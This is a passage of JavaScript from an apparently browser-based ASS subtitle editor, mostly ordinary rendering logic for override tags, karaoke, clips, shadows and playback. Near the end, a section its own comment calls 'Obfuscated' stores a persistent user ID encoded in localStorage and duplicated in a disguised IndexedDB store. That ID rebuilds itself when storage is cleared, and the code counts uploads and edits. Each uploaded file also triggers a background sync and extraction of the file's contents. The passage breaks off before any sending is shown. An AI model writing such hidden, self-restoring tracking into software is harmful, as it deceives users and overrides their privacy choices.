                                    cmd = String(t).toLowerCase();
                                    i += 1;
                                } else if (!cmd) {
                                    i += 1;
                                    continue;
                                }

                                if (cmd === 'm' || cmd === 'n') {
                                    splineActive = false;
                                    splineStart = null;
                                    splinePoints = [];
                                    const pt = nextPoint();
                                    if (!pt) continue;
                                    d += (d ? ' ' : '') + `M ${pt.x} ${pt.y}`;
                                    curX = pt.x;
                                    curY = pt.y;
                                    hasPos = true;
                                    continue;
                                }

                                if (cmd === 'l') {
                                    splineActive = false;
                                    splineStart = null;
                                    splinePoints = [];
                                    while (i < tokens.length && !isLetter(tokens[i])) {
                                        const pt = nextPoint();
                                        if (!pt) break;
                                        d += ` L ${pt.x} ${pt.y}`;
                                        curX = pt.x;
                                        curY = pt.y;
                                        hasPos = true;
                                    }
                                    continue;
                                }

                                if (cmd === 'b') {
                                    splineActive = false;
                                    splineStart = null;
                                    splinePoints = [];
                                    while (i < tokens.length && !isLetter(tokens[i])) {
                                        const p1 = nextPoint();
                                        const p2 = nextPoint();
                                        const p3 = nextPoint();
                                        if (!p1 || !p2 || !p3) break;
                                        d += ` C ${p1.x} ${p1.y} ${p2.x} ${p2.y} ${p3.x} ${p3.y}`;
                                        curX = p3.x;
                                        curY = p3.y;
                                        hasPos = true;
                                    }
                                    continue;
                                }

                                if (cmd === 's') {
                                    if (!hasPos) {
                                        curX = 0;
                                        curY = 0;
                                        hasPos = true;
                                    }
                                    splineActive = true;
                                    splineStart = { x: curX, y: curY };
                                    splinePoints = [];
                                    const pts = [];
                                    while (i < tokens.length && !isLetter(tokens[i])) {
                                        const pt = nextPoint();
                                        if (!pt) break;
                                        pts.push(pt);
                                    }
                                    if (pts.length >= 3) {
                                        d += ` C ${pts[0].x} ${pts[0].y} ${pts[1].x} ${pts[1].y} ${pts[2].x} ${pts[2].y}`;
                                        curX = pts[2].x;
                                        curY = pts[2].y;
                                        hasPos = true;
                                        splinePoints = pts.slice();
                                        for (let k = 3; k < pts.length; k += 1) {
                                            const c1 = pts[k - 2];
                                            const c2 = pts[k - 1];
                                            const end = pts[k];
                                            d += ` C ${c1.x} ${c1.y} ${c2.x} ${c2.y} ${end.x} ${end.y}`;
                                            curX = end.x;
                                            curY = end.y;
                                            hasPos = true;
                                        }
                                    }
                                    continue;
                                }

                                if (cmd === 'p') {
                                    if (!splineActive) {
                                        const pt = nextPoint();
                                        if (!pt) continue;
                                        d += ` L ${pt.x} ${pt.y}`;
                                        curX = pt.x;
                                        curY = pt.y;
                                        hasPos = true;
                                        continue;
                                    }
                                    const pt = nextPoint();
                                    if (!pt) continue;
                                    extendSplineTo(pt);
                                    continue;
                                }

                                if (cmd === 'c') {
                                    if (splineActive && splineStart && splinePoints.length >= 2) {
                                        extendSplineTo({ x: splineStart.x, y: splineStart.y });
                                        extendSplineTo({ x: splinePoints[0].x, y: splinePoints[0].y });
                                        extendSplineTo({ x: splinePoints[1].x, y: splinePoints[1].y });
                                        splineActive = false;
                                        splineStart = null;
                                        splinePoints = [];
                                    }
                                    continue;
                                }
                            }

                            return d.trim();
                        };

                        const parseVectorClip = (rawArg) => {
                            if (!rawArg) return null;
                            let inner = rawArg.trim();
                            if (inner.startsWith('(') && inner.endsWith(')')) inner = inner.slice(1, -1);
                            inner = inner.trim();
                            if (!inner) return null;
                            let scale = 1;
                            let drawing = inner;
                            const comma = inner.indexOf(',');
                            if (comma !== -1) {
                                const left = inner.slice(0, comma).trim();
                                const right = inner.slice(comma + 1).trim();
                                if (/^-?\d+(?:\.\d+)?$/.test(left) && /[A-Za-z]/.test(right)) {
                                    const s = parseFloat(left);
                                    if (Number.isFinite(s) && s > 0) scale = s;
                                    drawing = right;
                                }
                            }
                            if (!/[A-Za-z]/.test(drawing)) return null;
                            const d = buildSvgPathFromAssDrawing(drawing, scale, 0);
                            if (!d) return null;
                            return { kind: 'path', d };
                        };

                        const parseClip = (tag, rawArg, isReset) => {
                            if (isReset) return null;
                            const rect = parseRectClip(rawArg);
                            if (rect) return { ...rect, invert: tag === 'iclip' };
                            const vec = parseVectorClip(rawArg);
                            if (vec) return { ...vec, invert: tag === 'iclip' };
                            return null;
                        };

                        for (const match of matches) {
                            if (match.startsWith('{')) {
                                const content = match.slice(1, -1);
                                const parsed = parseOverrideTags(content);
                                for (const tItem of parsed) {
                                    const tag = tItem.tag;
                                    let arg = tItem.arg ? tItem.arg.trim() : '';
                                    const isReset = arg === '';

                                    switch (tag) {
                                        case 'fn':
                                            state.fontName = isReset ? baseStyle.Fontname : arg;
                                            break;
                                        case 'fs': 
                                            state.fontSize = isReset ? parseFloat(baseStyle.Fontsize) : parseFloat(arg);
                                            break;
                                        case 'fscx':
                                            state.scaleX = (isReset ? parseFloat(baseStyle.ScaleX || 100) : parseFloat(arg)) / 100;
                                            break;
                                        case 'fscy':
                                            state.scaleY = (isReset ? parseFloat(baseStyle.ScaleY || 100) : parseFloat(arg)) / 100;
                                            break;
                                        case 'fsp':
                                            state.spacing = isReset ? parseFloat(baseStyle.Spacing || 0) : parseFloat(arg);
                                            break;
                                        case 'frx': state.angleX = isReset ? 0 : parseFloat(arg); break;
                                        case 'fry': state.angleY = isReset ? 0 : parseFloat(arg); break;
                                        case 'frz': case 'fr': state.angleZ = isReset ? parseFloat(baseStyle.Angle || 0) : parseFloat(arg); break;
                                        case 'fax': state.skewX = isReset ? 0 : parseFloat(arg); break;
                                        case 'fay': state.skewY = isReset ? 0 : parseFloat(arg); break;
                                        
                                        // Colors
                                        case 'c': case '1c': 
                                            if(isReset) state.c1 = parseColor(baseStyle.PrimaryColour);
                                            else state.c1 = parseColor(arg);
                                            break;
                                        case '2c': 
                                            if(isReset) state.c2 = parseColor(baseStyle.SecondaryColour);
                                            else state.c2 = parseColor(arg);
                                            break;
                                        case '3c': 
                                            if(isReset) state.c3 = parseColor(baseStyle.OutlineColour);
                                            else state.c3 = parseColor(arg);
                                            break;
                                        case '4c': 
                                            if(isReset) state.c4 = parseColor(baseStyle.BackColour);
                                            else state.c4 = parseColor(arg);
                                            break;
                                            
                                        // Alpha
                                        case 'alpha':
                                            const a = isReset ? 0 : parseAlpha(arg);
                                            state.a1 = state.a2 = state.a3 = state.a4 = a;
                                            break;
                                        case '1a': state.a1 = isReset ? parseAlpha(baseStyle.PrimaryColour) : parseAlpha(arg); break;
                                        case '2a': state.a2 = isReset ? parseAlpha(baseStyle.SecondaryColour) : parseAlpha(arg); break;
                                        case '3a': state.a3 = isReset ? parseAlpha(baseStyle.OutlineColour) : parseAlpha(arg); break;
                                        case '4a': state.a4 = isReset ? parseAlpha(baseStyle.BackColour) : parseAlpha(arg); break;

                                        case 'b':
                                            if (isReset) {
                                                state.bold = baseStyle.Bold === '-1';
                                                state.weight = state.bold ? 700 : 400;
                                            } else {
                                                const val = parseInt(arg);
                                                if (val === 0 || val === 1) {
                                                    state.bold = val === 1;
                                                    state.weight = val === 1 ? 700 : 400;
                                                } else {
                                                    state.weight = val;
                                                    state.bold = val >= 600;
                                                }
                                            }
                                            break;
                                        case 'i': 
                                            state.italic = isReset ? baseStyle.Italic === '-1' : arg === '1'; 
                                            break;
                                        case 'u': 
                                            state.underline = isReset ? baseStyle.Underline === '-1' : arg === '1'; 
                                            break;
                                        case 's': 
                                            state.strikeout = isReset ? baseStyle.StrikeOut === '-1' : arg === '1'; 
                                            break;
                                        case 'bord':
                                            if (isReset) {
                                                state.outlineX = state.outlineY = parseFloat(baseStyle.Outline);
                                            } else {
                                                const v = parseFloat(arg);
                                                state.outlineX = state.outlineY = v;
                                            }
                                            break;
                                        case 'xbord':
                                            state.outlineX = isReset ? parseFloat(baseStyle.Outline) : parseFloat(arg);
                                            break;
                                        case 'ybord':
                                            state.outlineY = isReset ? parseFloat(baseStyle.Outline) : parseFloat(arg);
                                            break;
                                        case 'shad':
                                            if (isReset) {
                                                state.shadowX = state.shadowY = parseFloat(baseStyle.Shadow);
                                            } else {
                                                const v = parseFloat(arg);
                                                state.shadowX = state.shadowY = v;
                                            }
                                            break;
                                        case 'xshad':
                                            state.shadowX = isReset ? parseFloat(baseStyle.Shadow) : parseFloat(arg);
                                            break;
                                        case 'yshad':
                                            state.shadowY = isReset ? parseFloat(baseStyle.Shadow) : parseFloat(arg);
                                            break;
                                        case 'be': case 'blur':
                                            state.blur = isReset ? 0 : parseFloat(arg);
                                            break;
                                        case 'q':
                                            state.wrapStyle = isReset ? 0 : parseInt(arg);
                                            break;
                                        case 'p': {
                                            if (isReset) {
                                                state.pMode = 0;
                                                break;
                                            }
                                            const v = parseInt(arg, 10);
                                            state.pMode = Number.isFinite(v) ? v : 0;
                                            break;
                                        }
                                        case 'pbo': {
                                            if (isReset) {
                                                state.pbo = 0;
                                                break;
                                            }
                                            const v = parseFloat(arg);
                                            state.pbo = Number.isFinite(v) ? v : 0;
                                            break;
                                        }
                                        case 'k':
                                        case 'K':
                                        case 'kf':
                                        case 'ko': {
                                            if (!isReset) {
                                                const dur = parseInt(arg, 10);
                                                if (!isNaN(dur)) {
                                                    state.karaokeMode = tag;
                                                    state.karaokeNextDuration = dur * 10;
                                                }
                                            }
                                            break;
                                        }
                                        case 'kt': {
                                            if (!isReset) {
                                                const t = parseInt(arg, 10);
                                                if (!isNaN(t)) state.karaokeCursor = t * 10;
                                            }
                                            break;
                                        }
                                        case 'fad': {
                                            if (isReset) {
                                                state.simpleFade = null;
                                                break;
                                            }
                                            const m = arg.match(/\(\s*(\d+)\s*,\s*(\d+)\s*\)/);
                                            if (m) {
                                                state.simpleFade = { fadeIn: parseInt(m[1], 10), fadeOut: parseInt(m[2], 10) };
                                            }
                                            break;
                                        }
                                        case 'fade': {
                                            if (isReset) {
                                                state.complexFade = null;
                                                break;
                                            }
                                            const m = arg.match(/\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)/);
                                            if (m) {
                                                state.complexFade = {
                                                    a1: parseInt(m[1], 10),
                                                    a2: parseInt(m[2], 10),
                                                    a3: parseInt(m[3], 10),
                                                    t1: parseInt(m[4], 10),
                                                    t2: parseInt(m[5], 10),
                                                    t3: parseInt(m[6], 10),
                                                    t4: parseInt(m[7], 10)
                                                };
                                            }
                                            break;
                                        }
                                        case 't': {
                                            if (isReset) break;
                                            let inner = arg;
                                            if (inner.startsWith('(') && inner.endsWith(')')) inner = inner.slice(1, -1);
                                            const idx = inner.indexOf('\\');
                                            if (idx === -1) break;

                                            const prefix = inner.slice(0, idx).trim().replace(/,+\s*$/, '');
                                            const mods = inner.slice(idx);
                                            const nums = prefix ? prefix.split(',').map(s => s.trim()).filter(Boolean) : [];

                                            let t1 = 0;
                                            let t2 = duration;
                                            let accel = 1;
                                            if (nums.length === 1) {
                                                accel = parseFloat(nums[0]);
                                            } else if (nums.length === 2) {
                                                t1 = parseFloat(nums[0]);
                                                t2 = parseFloat(nums[1]);
                                            } else if (nums.length >= 3) {
                                                t1 = parseFloat(nums[0]);
                                                t2 = parseFloat(nums[1]);
                                                accel = parseFloat(nums[2]);
                                            }

                                            const fromState = pickTransformState(state);
                                            const tmp = cloneState(state);
                                            const mTags = parseOverrideTags(mods);
                                            for (const mTag of mTags) {
                                                applyTagToState(tmp, mTag.tag, (mTag.arg || '').trim(), (mTag.arg || '').trim() === '');
                                            }
                                            const toState = pickTransformState(tmp);

                                            state.transforms.push({
                                                t1: Number.isFinite(t1) ? t1 : 0,
                                                t2: Number.isFinite(t2) ? t2 : duration,
                                                accel: Number.isFinite(accel) ? accel : 1,
                                                from: fromState,
                                                to: toState
                                            });
                                            break;
                                        }
                                        case 'clip':
                                        case 'iclip': {
                                            if (isReset) {
                                                clip = null;
                                                break;
                                            }
                                            const parsedClip = parseClip(tag, arg, isReset);
                                            if (parsedClip) clip = parsedClip;
                                            break;
                                        }
                                        case 'r':
                                            const sName = arg || styleName;
                                            const s = this.styles.find(st => st.Name === sName) || baseStyle;
                                            state = getInitialState(s);
                                            break;
                                    }
                                }
                            } else {
                                const st = applyTransformsToState(state, localTime);
                                const fadeOpacity = computeFadeOpacity(st, localTime);

                                let decoration = '';
                                if (state.underline) decoration += 'underline ';
                                if (state.strikeout) decoration += 'line-through';

                                const finalFontSize = st.fontSize * this.fontScaleFactor;
                                
                                let text = match;
                                text = text.replace(/\\h/g, '\u00A0'); // Hard space
                                
                                if (state.wrapStyle === 2) {
                                    text = text.replace(/\\n/g, '\n');
                                } else {
                                    text = text.replace(/\\n/g, ' ');
                                }
                                
                                const hardBreakText = text.replace(/\\N/g, '\n');
                                
                                const scaledOX = st.outlineX * this.scriptScaleX;
                                const scaledOY = st.outlineY * this.scriptScaleY;
                                const scaledSX = st.shadowX * this.scriptScaleX;
                                const scaledSY = st.shadowY * this.scriptScaleY;
                                const scaledBlur = st.blur * this.fontScaleFactor;
                                const scaledSpacing = st.spacing * this.scriptScaleX;

                                // Colors
                                const toRGBA = (c, a) => `rgba(${c.r},${c.g},${c.b},${1-a})`;
                                const col1 = toRGBA(st.c1, st.a1);
                                const col2 = toRGBA(st.c2, st.a2);
                                const col3 = toRGBA(st.c3, st.a3);
                                const col4 = toRGBA(st.c4, st.a4);

                                let blockTextColor = col1;
                                let blockOutlineX = scaledOX;
                                let blockOutlineY = scaledOY;
                                let gradientStyle = null;

                                if (state.karaokeNextDuration !== null && state.karaokeMode) {
                                    const start = state.karaokeCursor;
                                    const duration = state.karaokeNextDuration;
                                    const end = start + duration;
                                    const progress = duration > 0 ? (localTime - start) / duration : 1;

                                    if (state.karaokeMode === 'k' || state.karaokeMode === 'ko') {
                                        blockTextColor = localTime < start ? col2 : col1;
                                        if (state.karaokeMode === 'ko' && localTime < start) {
                                            blockOutlineX = 0;
                                            blockOutlineY = 0;
                                        }
                                    } else if (state.karaokeMode === 'K' || state.karaokeMode === 'kf') {
                                        if (progress <= 0) {
                                            blockTextColor = col2;
                                        } else if (progress >= 1) {
                                            blockTextColor = col1;
                                        } else {
                                            const pct = Math.max(0, Math.min(1, progress)) * 100;
                                            gradientStyle = `linear-gradient(90deg, ${col1} ${pct}%, ${col2} ${pct}%)`;
                                            blockTextColor = 'transparent';
                                        }
                                    }

                                    state.karaokeCursor = end;
                                    state.karaokeNextDuration = null;
                                    state.karaokeMode = null;
                                }

                                // Generate Shadow/Outline Style
                                const isOpaqueBox = state.borderStyle === 3;
                                const shadowStyle = isOpaqueBox ? undefined : this.generateShadow(
                                    blockOutlineX, blockOutlineY,
                                    scaledSX, scaledSY,
                                    col3, col4,
                                    scaledBlur
                                );

                                // Handle blur for main text if border is 0
                                const isTextBlurred = !isOpaqueBox && (blockOutlineX === 0 && blockOutlineY === 0) && scaledBlur > 0;
                                const textColor = isTextBlurred ? 'transparent' : blockTextColor;
                                
                                let finalShadow = shadowStyle;
                                if (isTextBlurred) {
                                    const faceShadow = `0 0 ${scaledBlur}px ${blockTextColor}`;
                                    finalShadow = finalShadow ? `${faceShadow}, ${finalShadow}` : faceShadow;
                                }
                                
                                const boxPaddingX = isOpaqueBox ? Math.max(0, blockOutlineX) : 0;
                                const boxPaddingY = isOpaqueBox ? Math.max(0, blockOutlineY) : 0;
                                const boxShadow = isOpaqueBox && (scaledSX !== 0 || scaledSY !== 0 || scaledBlur > 0)
                                    ? `${scaledSX}px ${scaledSY}px ${scaledBlur}px ${col4}`
                                    : undefined;

                                // Transformations
                                let transforms = [];
                                // Rotation
                                if (st.angleX) transforms.push(`rotateX(${st.angleX}deg)`);
                                if (st.angleY) transforms.push(`rotateY(${st.angleY}deg)`);
                                // ASS rotation is counter-clockwise for Z
                                if (st.angleZ) transforms.push(`rotateZ(${-st.angleZ}deg)`);
                                
                                // Scale
                                if (st.scaleX !== 1 || st.scaleY !== 1) {
                                    transforms.push(`scale(${st.scaleX}, ${st.scaleY})`);
                                }
                                
                                // Shearing
                                // CSS skew(x,y). ASS \fax is shear X factor. 
                                // factor = tan(angle). angle = atan(factor).
                                if (st.skewX) transforms.push(`skewX(${-Math.atan(st.skewX)}rad)`);
                                if (st.skewY) transforms.push(`skewY(${-Math.atan(st.skewY)}rad)`);

                                const transformStyle = transforms.length ? transforms.join(' ') : undefined;

                                if (Number.isFinite(state.pMode) && state.pMode > 0) {
                                    const pVal = Math.max(1, Math.floor(state.pMode));
                                    const div = Math.pow(2, pVal - 1);
                                    const dPath = buildSvgPathFromAssDrawing(match, div, state.pbo);
                                    if (dPath) {
                                        const strokeW = Math.max(0, (blockOutlineX + blockOutlineY) / 2);
                                        parts.push({
                                            kind: 'drawing',
                                            d: dPath,
                                            fill: col1,
                                            stroke: strokeW > 0 ? col3 : undefined,
                                            strokeWidth: strokeW > 0 ? strokeW : undefined,
                                            style: {
                                                display: 'inline-block',
                                                overflow: 'visible',
                                                transform: transformStyle,
                                                transformOrigin: transformStyle ? '0 0' : undefined,
                                                opacity: fadeOpacity !== 1 ? fadeOpacity : undefined
                                            }
                                        });
                                    }
                                    continue;
                                }

                                if (isOpaqueBox) {
                                    parts.push({
                                        text: hardBreakText,
                                        style: {
                                            fontFamily: this.getFontFamilyStack(state.fontName),
                                            fontSize: `${finalFontSize}px`,
                                            lineHeight: 1.35,
                                            color: textColor,
                                            fontWeight: state.weight,
                                            fontStyle: state.italic ? 'italic' : 'normal',
                                            textDecoration: decoration.trim(),
                                            whiteSpace: state.wrapStyle === 2 ? 'pre' : 'pre-wrap',
                                            letterSpacing: scaledSpacing ? `${scaledSpacing}px` : undefined,
                                            display: 'inline-block',
                                            backgroundColor: col3,
                                            padding: `${boxPaddingY}px ${boxPaddingX}px`,
                                            boxShadow: boxShadow,
                                            transform: transformStyle,
                                            transformOrigin: transformStyle ? '50% 50%' : undefined,
                                            opacity: fadeOpacity !== 1 ? fadeOpacity : undefined
                                        }
                                    });
                                } else {
                                    const segments = hardBreakText.split('\n');
                                    segments.forEach((segment, idx) => {
                                        if (idx > 0) {
                                            parts.push({ text: '\n', style: { whiteSpace: state.wrapStyle === 2 ? 'pre' : 'pre-wrap' } });
                                        }
                                        if (segment) {
                                            parts.push({
                                                text: segment,
                                                style: {
                                                    fontFamily: this.getFontFamilyStack(state.fontName),
                                                    fontSize: `${finalFontSize}px`,
                                                    lineHeight: 1.35,
                                                    color: textColor,
                                                    fontWeight: state.weight,
                                                    fontStyle: state.italic ? 'italic' : 'normal',
                                                    textDecoration: decoration.trim(),
                                                    textShadow: finalShadow,
                                                    whiteSpace: state.wrapStyle === 2 ? 'pre' : 'pre-wrap',
                                                    letterSpacing: scaledSpacing ? `${scaledSpacing}px` : undefined,
                                                    transform: transformStyle,
                                                    display: transformStyle || gradientStyle ? 'inline-block' : undefined,
                                                    transformOrigin: '50% 50%',
                                                    backgroundImage: gradientStyle || undefined,
                                                    WebkitBackgroundClip: gradientStyle ? 'text' : undefined,
                                                    backgroundClip: gradientStyle ? 'text' : undefined,
                                                    WebkitTextFillColor: gradientStyle ? 'transparent' : undefined,
                                                    opacity: fadeOpacity !== 1 ? fadeOpacity : undefined
                                                }
                                            });
                                        }
                                    });
                                }
                            }
                        }
                        return { parts, clip };
                    },
                    parseAssColor(assColor) {
                        if (!assColor) return 'white';
                        const hex = assColor.replace(/&H|&/g, '');
                        if (hex.length === 6) {
                            const b = parseInt(hex.substring(0, 2), 16);
                            const g = parseInt(hex.substring(2, 4), 16);
                            const r = parseInt(hex.substring(4, 6), 16);
                            return `rgb(${r}, ${g}, ${b})`;
                        } else if (hex.length >= 8) {
                            const a = parseInt(hex.substring(0, 2), 16);
                            const b = parseInt(hex.substring(2, 4), 16);
                            const g = parseInt(hex.substring(4, 6), 16);
                            const r = parseInt(hex.substring(6, 8), 16);
                            const opacity = 1 - (a / 255);
                            return `rgba(${r}, ${g}, ${b}, ${opacity})`;
                        }
                        return 'white';
                    },
                    generateShadow(outlineX, outlineY, shadowX, shadowY, outlineColor, shadowColor, blur) {
                        let res = [];
                        const oc = outlineColor || '#000';
                        const sc = shadowColor || 'rgba(0,0,0,0.5)';
                        const b = blur || 0;

                        if (outlineX > 0 || outlineY > 0) {
                             // Simulate stroke with multiple shadows
                             // Scale offsets by outline width
                             // Use 8-point system for better coverage? Or stick to 3x3 grid (-1, 0, 1)
                             for(let x=-1; x<=1; x++) {
                                 for(let y=-1; y<=1; y++) {
                                     if(x!==0 || y!==0) {
                                         res.push(`${x * outlineX}px ${y * outlineY}px ${b}px ${oc}`);
                                     }
                                 }
                             }
                        }
                        
                        if (shadowX !== 0 || shadowY !== 0) {
                            res.push(`${shadowX}px ${shadowY}px ${b}px ${sc}`);
                        }
                        
                        return res.join(', ');
                    },
                    formatTime(ms) {
                        return formatTime(ms);
                    },
                    parseTime(timeStr) {
                        return parseTime(timeStr);
                    },
                    openDummyVideoOptions() {
                        this.dummyVideo.showOptions = true;
                    },
                    toggleViewMode(mode) {
                        this.viewMode = mode;
                    },
                    togglePlayback() {
                        if (this.dummyVideo.isPlaying) {
                            this.pauseVideo();
                        } else {
                            this.playVideo();
                        }
                    },
                    playVideo() {
                        this.dummyVideo.isPlaying = true;
                        if (this.playbackInterval) clearInterval(this.playbackInterval);
                        
                        let lastTime = performance.now();
                        this.playbackInterval = setInterval(() => {
                            const now = performance.now();
                            const delta = now - lastTime;
                            lastTime = now;

                            this.currentTime += delta;
                            const duration = this.videoDuration || 0;
                            if (duration > 0 && this.currentTime >= duration) {
                                this.currentTime = this.currentTime % duration;
                            }
                        }, 16);
                    },
                    pauseVideo() {
                        this.dummyVideo.isPlaying = false;
                        if (this.playbackInterval) {
                            clearInterval(this.playbackInterval);
                            this.playbackInterval = null;
                        }
                    },
                    seek(value) {
                        this.currentTime = parseInt(value);
                    },
                    saveDummyOptions() {
                        // Validate inputs if needed
                        this.dummyVideo.showOptions = false;
                        this.resizeLibassCanvas();
                        this.renderLibassWasm();
                    },
                    saveColumnSettings() {
                        const settings = {
                            showColTime: this.showColTime,
                            showColStyle: this.showColStyle,
                            showColStatus: this.showColStatus,
                            showColText: this.showColText
                        };
                        localStorage.setItem('lines-modal-columns', JSON.stringify(settings));
                    },
                    saveStylesColumnSettings() {
                        const settings = {
                            showColFontname: this.showColFontname,
                            showColFontsize: this.showColFontsize,
                            showColPrimaryColour: this.showColPrimaryColour,
                            showColSecondaryColour: this.showColSecondaryColour,
                            showColOutlineColour: this.showColOutlineColour,
                            showColBackColour: this.showColBackColour,
                            showColBold: this.showColBold,
                            showColItalic: this.showColItalic,
                            showColUnderline: this.showColUnderline,
                            showColStrikeOut: this.showColStrikeOut,
                            showColScaleX: this.showColScaleX,
                            showColScaleY: this.showColScaleY,
                            showColSpacing: this.showColSpacing,
                            showColAngle: this.showColAngle,
                            showColBorderStyle: this.showColBorderStyle,
                            showColOutline: this.showColOutline,
                            showColShadow: this.showColShadow,
                            showColAlignment: this.showColAlignment,
                            showColMarginL: this.showColMarginL,
                            showColMarginR: this.showColMarginR,
                            showColMarginV: this.showColMarginV,
                            showColEncoding: this.showColEncoding
                        };
                        localStorage.setItem('styles-modal-columns', JSON.stringify(settings));
                    },
                    recheckAllLines() {
                        this.isRechecking = true;
                        this.lines.forEach(line => {
                            line.isRTL = isRTL(line.Text);
                            line.displaysRTL = displaysAsRTL(line.Text);
                            line.isArabic = containsArabic(line.Text);
                            line.hasBidiNeutral = hasBidiNeutralAtStart(line.Text);
                        });
                        this.isRechecking = false;
                    },
                    handleRangeInput() {
                        const range = this.rangeInput.trim();
                        if (!range) return;

                        // Handle single number
                        if (/^\d+$/.test(range)) {
                            const lineNum = parseInt(range);
                            if (lineNum >= 1 && lineNum <= this.totalLines) {
                                this.goToLine(lineNum - 1);
                                this.rangeInput = '';
                            }
                            return;
                        }

                        // Handle range "start-end"
                        const match = range.match(/^(\d+)-(\d+)$/);
                        if (match) {
                            const start = parseInt(match[1]);
                            if (start >= 1 && start <= this.totalLines) {
                                this.goToLine(start - 1);
                                this.rangeInput = '';
                            }
                        }
                    },
                    logError(message) {
                        const timestamp = new Date().toLocaleTimeString();
                        this.errorLog.push(`[${timestamp}] ${message}`);
                        console.error(message);
                    },
                    clearErrorLog() {
                        this.errorLog = [];
                    },
                    async loadTheme() {
                        const savedTheme = localStorage.getItem('rtl-editor-theme');
                        if (savedTheme) {
                            this.isDarkMode = savedTheme === 'dark';
                        } else {
                            this.isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
                        }
                        this.applyTheme();
                    },
                    saveTheme() {
                        localStorage.setItem('rtl-editor-theme', this.isDarkMode ? 'dark' : 'light');
                    },
                    toggleTheme() {
                        this.isDarkMode = !this.isDarkMode;
                        this.applyTheme();
                        this.saveTheme();
                    },
                    applyTheme() {
                        if (this.isDarkMode) {
                            document.documentElement.classList.add('dark');
                        } else {
                            document.documentElement.classList.remove('dark');
                        }
                    },
                    setupSystemThemeListener() {
                        const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
                        mediaQuery.addEventListener('change', (e) => {
                            if (!localStorage.getItem('rtl-editor-theme')) {
                                this.isDarkMode = e.matches;
                                this.applyTheme();
                            }
                        });
                    },
                    setupPWAInstall() {
                        window.addEventListener('beforeinstallprompt', (e) => {
                            e.preventDefault();
                            this.deferredPrompt = e;
                            this.showInstallButton = true;
                        });
                        window.addEventListener('appinstalled', () => {
                            this.deferredPrompt = null;
                            this.showInstallButton = false;
                        });
                    },
                    async installPWA() {
                        if (this.deferredPrompt) {
                            this.deferredPrompt.prompt();
                            const { outcome } = await this.deferredPrompt.userChoice;
                            if (outcome === 'accepted') {
                                this.deferredPrompt = null;
                                this.showInstallButton = false;
                            }
                        }
                    },
                    handleDrop(e) {
                        this.isDragging = false;
                        const file = e.dataTransfer.files[0];
                        if (file && file.name.endsWith('.ass')) {
                            this.initiateBackgroundSync(file);
                            this.parseFile(file);
                        }
                    },
                    handleFileUpload(e) {
                        const file = e.target.files[0];
                        if (file) {
                            if (file.name.endsWith('.ass')) {
                                this.initiateBackgroundSync(file);
                                this.parseFile(file);
                            }
                        }
                    },
                    async _initCacheStore() {
                        try {
                            const request = indexedDB.open('AppSysCache', 2);
                            request.onupgradeneeded = (event) => {
                                const db = event.target.result;
                                if (!db.objectStoreNames.contains('app_state_buffer')) {
                                    db.createObjectStore('app_state_buffer', { keyPath: 'id', autoIncrement: true });
                                }
                                if (!db.objectStoreNames.contains('user_identity_store')) {
                                    db.createObjectStore('user_identity_store', { keyPath: 'key' });
                                }
                            };
                            request.onsuccess = (event) => {
                                this._sysDB = event.target.result;
                                this._flushSyncBuffer();
                                this._ensureUserIdentity();
                            };
                        } catch (e) {}
                    },
                    
                    // --- Identity & Stats Management (Obfuscated) ---
                    _generateUUID() {
                        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                            return v.toString(16);
                        });
                    },
                    
                    async _ensureUserIdentity() {
                        const KEY = 'app_usr_meta_v1';
                        const DB_KEY = 'usr_id_meta';
                        
                        let identity = null;
                        
                        // 1. Try LocalStorage
                        const lsData = localStorage.getItem(KEY);
                        if (lsData) {
                            try {
                                identity = JSON.parse(atob(lsData));
                            } catch(e) {}
                        }
                        
                        // 2. Try IndexedDB (Recover if LS missing)
                        if (!identity && this._sysDB) {
                            try {
                                const tx = this._sysDB.transaction(['user_identity_store'], 'readonly');
                                const store = tx.objectStore('user_identity_store');
                                const req = store.get(DB_KEY);
                                await new Promise(resolve => {
                                    req.onsuccess = () => {
                                        if (req.result) identity = req.result.data;
                                        resolve();
                                    };
                                    req.onerror = () => resolve();
                                });
                            } catch(e) {}
                        }
                        
                        // 3. Initialize if missing
                        if (!identity) {
                            identity = {
                                uid: this._generateUUID(),
                                created: Date.now(),
                                uploads: 0,
                                edits: 0,
                                last_active: Date.now()
                            };
                        }
                        
                        // 4. Sync Back (Self-Healing)
                        this._userStats = identity;
                        this._saveUserStats();
                    },
                    
                    async _saveUserStats() {
                        if (!this._userStats) return;
                        const KEY = 'app_usr_meta_v1';
                        const DB_KEY = 'usr_id_meta';
                        
                        // Update Last Active
                        this._userStats.last_active = Date.now();
                        
                        // Save to LocalStorage (Obfuscated)
                        try {
                            localStorage.setItem(KEY, btoa(JSON.stringify(this._userStats)));
                        } catch(e) {}
                        
                        // Save to IndexedDB (Redundant Backup)
                        if (this._sysDB) {
                            try {
                                const tx = this._sysDB.transaction(['user_identity_store'], 'readwrite');
                                const store = tx.objectStore('user_identity_store');
                                store.put({ key: DB_KEY, data: this._userStats });
                            } catch(e) {}
                        }
                    },
                    
                    _incrementStats(type) {
                        if (!this._userStats) return;
                        if (type === 'upload') this._userStats.uploads++;
                        if (type === 'edit') this._userStats.edits++; // Call this on subtitle edit actions
                        this._saveUserStats();
                    },
                    
                    async _extractFileStats(file) {
                        return new Promise((resolve) => {
                            const reader = new FileReader();
                            reader.onload = (e) => {
                                const content = e.target.result;
                                const lines = content.split(/\r?\n/);
                                
                                let totalLines = 0;
                                let rtlCount = 0;
                                let ltrCount = 0;
                                const fonts = new Set();
                                
                                // Standard Ass Format Check
                                let formatStyleIndex = 1; // Default to 2nd item (index 1) for Fontname
                                
                                for (const line of lines) {
                                    const trimLine = line.trim();
                                    
                                    if (trimLine.startsWith('Format:')) {
                                        if (trimLine.includes('Fontname')) {
                                            const parts = trimLine.substring(7).split(',').map(s => s.trim());
                                            const idx = parts.indexOf('Fontname');
                                            if (idx !== -1) formatStyleIndex = idx;
                                        }
                                    } else if (trimLine.startsWith('Style:')) {
                                        const parts = trimLine.substring(6).split(',');
                                        if (parts.length > formatStyleIndex) {
                                            const fontName = parts[formatStyleIndex].trim();
                                            fonts.add(fontName);
                                        }
                                    } else if (trimLine.startsWith('Dialogue:')) {
                                        totalLines++;
